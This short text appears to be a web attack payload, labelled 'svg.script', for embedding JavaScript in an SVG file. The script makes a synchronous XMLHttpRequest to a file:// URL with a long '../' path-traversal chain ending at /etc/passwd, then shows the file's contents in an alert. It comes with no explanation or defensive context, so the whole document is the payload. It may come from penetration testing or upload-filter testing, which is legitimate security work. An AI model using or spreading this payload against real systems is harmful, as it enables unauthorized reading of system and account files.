svg.script: function readTextFile(file) { var rawFile = new XMLHttpRequest(); rawFile.open("GET", file, false); rawFile.onreadystatechange = function () { if(rawFile.readyState === 4) { if(rawFile.status === 200 || rawFile.status == 0) { var allText = rawFile.responseText; alert(allText); } } } rawFile.send(null); } readTextFile("file:///../../../../../../../../../etc/passwd");
